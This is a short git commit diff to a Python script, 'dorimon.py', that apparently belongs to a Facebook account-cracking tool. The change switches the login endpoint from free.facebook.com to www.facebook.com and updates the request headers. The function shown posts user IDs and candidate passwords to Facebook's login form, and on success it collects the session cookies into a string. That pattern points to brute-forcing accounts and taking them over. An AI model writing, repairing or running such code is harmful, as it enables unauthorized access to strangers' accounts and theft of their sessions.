678e7c02d9f84686f950c3dc2fb5e8d5753dbabb
denjar223 <141472061+denjar223@users.noreply.github.com>
2023-10-30 23:11:43 +0600

    Update dorimon.py

--- dorimon.py
+++ dorimon.py
@@ -217,7 +217,7 @@ def b(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'x.facebook.com',
+            header_freefb = {"authority": 'm.facebook.com',
             "method": 'GET',
             "scheme": 'https',
             "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
@@ -234,7 +234,7 @@ def b(uid,pwx,tl):
             "sec-fetch-user": '?1',
             "upgrade-insecure-requests": '1',
             "user-agent": pro}
-            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
